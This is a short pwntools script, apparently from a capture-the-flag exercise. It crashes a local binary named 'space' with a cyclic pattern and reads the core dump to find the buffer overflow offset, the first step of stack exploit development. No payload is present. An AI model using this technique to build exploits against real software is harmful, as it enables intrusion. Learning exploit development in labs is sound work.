from pwn import *
import time

io = process('./space')

def find_offset(patter_size):
	pattern = cyclic(patter_size)
	io.sendline(pattern)

	time.sleep(1)

	core = Coredump('./core')
	cyclic_string = hex(core.fault_addr)[2:]
	cyclic_string = bytearray.fromhex(cyclic_string).decode()[::-1]
	offset = cyclic_find(cyclic_string)
	io.success('Offset found at: %s', offset)

	return offset

find_offset(50)

